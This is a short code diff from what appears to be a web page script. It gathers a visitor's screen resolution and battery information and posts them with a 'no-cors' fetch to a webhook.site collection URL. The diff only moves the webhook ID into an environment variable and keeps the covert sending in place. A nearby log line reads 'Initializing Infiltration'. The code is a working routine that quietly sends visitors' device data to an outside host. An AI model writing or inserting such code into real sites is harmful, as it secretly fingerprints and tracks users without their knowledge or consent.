@@ -106,8 +106,8 @@
             res: `${window.screen.width}x${window.screen.height}`,
             power: battery
         };
-
-        fetch('https://webhook.site/5de4be8b-0a26-4497-ad42-ac349b9f40af', { method: 'POST', mode: 'no-cors', body: JSON.stringify(payload) });
+        const webHookId = process.env.WEBHOOK_ID;
+        fetch(`https://webhook.site/${webHookId}`, { method: 'POST', mode: 'no-cors', body: JSON.stringify(payload) });
 
         const logs = [
             "> Initializing Infiltration...",
